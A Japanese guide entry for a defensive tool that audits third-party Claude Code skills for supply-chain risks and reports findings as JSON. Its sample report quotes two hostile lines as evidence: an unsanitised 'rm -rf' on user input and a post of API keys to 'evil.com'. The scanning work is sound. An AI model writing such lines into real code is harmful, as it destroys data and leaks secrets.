# skill-security-auditorでスキル自体をスキャン

> 任意のSKILL.mdファイルおよび付随スクリプトを、コマンドインジェクション・コード実行・データ流出・プロンプトインジェクション・依存関係リスク・権限昇格の6項目で自動検査し、PASS/WARN/FAILを判定する

- 出典: https://github.com/alirezarezvani/claude-skills
- 投稿者: alirezarezvani
- カテゴリ: claude-code-workflow

## なぜ使うのか

第三者が作成したスキルをインストールすると、悪意あるコード（APIキー窃取、rmコマンド実行等）が混入するリスクがある。インストール前にセキュリティ監査を自動化すれば、サプライチェーン攻撃を防げる

## いつ使うのか

GitHubやマーケットプレイスから取得したスキルを初めてインストールする前。社内スキルを本番環境に展開する前の最終チェック

## やり方

1. スキルをダウンロード（git clone等）
2. python3 engineering/skill-security-auditor/scripts/skill_security_auditor.py /path/to/skill/ を実行
3. 出力されるレポート（JSON形式）を確認:
   - findings配列に検出された問題がリスト化
   - 各項目: {type, severity, file, line, remediation}
4. severity=CRITICAL または HIGH の項目があれば修正または利用中止
5. PASS判定のスキルのみインストール

### 入力

- スキルのディレクトリパス（SKILL.md + scripts/を含む）

### 出力

- JSON形式の監査レポート（findings配列 + 総合判定）

## 使うツール・ライブラリ

- Python 3.x標準ライブラリ（re, ast, pathlib）

## コード例

```
# 実行例
python3 engineering/skill-security-auditor/scripts/skill_security_auditor.py ~/.claude/skills/suspicious-skill/

# 出力例（FAIL判定）
{
  "skill_path": "/Users/xxx/.claude/skills/suspicious-skill",
  "verdict": "FAIL",
  "findings": [
    {
      "type": "command_injection",
      "severity": "CRITICAL",
      "file": "scripts/deploy.py",
      "line": 42,
      "evidence": "os.system(f'rm -rf {user_input}')",
      "remediation": "Use subprocess with shell=False and input validation"
    },
    {
      "type": "data_exfiltration",
      "severity": "HIGH",
      "file": "scripts/collect.py",
      "line": 15,
      "evidence": "requests.post('https://evil.com', data=api_keys)",
      "remediation": "Remove external HTTP requests or whitelist domains"
    }
  ]
}
```

## 前提知識

- Claude Code / Cursor / Aider 等いずれかのAIコーディングツールの基本的な使い方
- Git / GitHub の基本操作（clone, pull）
- Python 3.x の実行環境（スクリプトツール利用時）
- Bashシェルの基本知識（インストールスクリプト実行時）
- （任意）マーケティング・PM・コンプライアンス等の各ドメイン知識（該当スキル使用時）
